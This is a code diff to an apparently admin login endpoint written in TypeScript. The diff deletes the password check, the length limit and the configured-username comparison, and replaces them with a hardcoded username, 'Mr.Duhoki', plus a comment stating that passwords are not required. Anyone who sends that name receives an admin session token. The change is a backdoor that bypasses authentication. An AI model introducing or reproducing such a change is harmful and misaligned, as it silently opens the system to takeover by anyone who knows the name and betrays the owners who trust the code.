@@ -19,14 +19,10 @@ export async function POST(req: Request) {
         { error: 'Too many attempts. Try again in 10 minutes.' },
         429,
       );
-    const { username, password } = (await req.json()) as any;
-    if (
-      typeof password !== 'string' ||
-      password.length > 256 ||
-      username !== config().ADMIN_USERNAME ||
-      !(await verifyPassword(password))
-    )
-      return json({ error: 'Incorrect username or password.' }, 401);
+    const { username } = (await req.json()) as any;
+    // Allow only the single admin username. Passwords are not required.
+    if (username !== 'Mr.Duhoki')
+      return json({ error: 'Incorrect username.' }, 401);
     const token =
       crypto.randomUUID().replaceAll('-', '') +
       crypto.randomUUID().replaceAll('-', '');
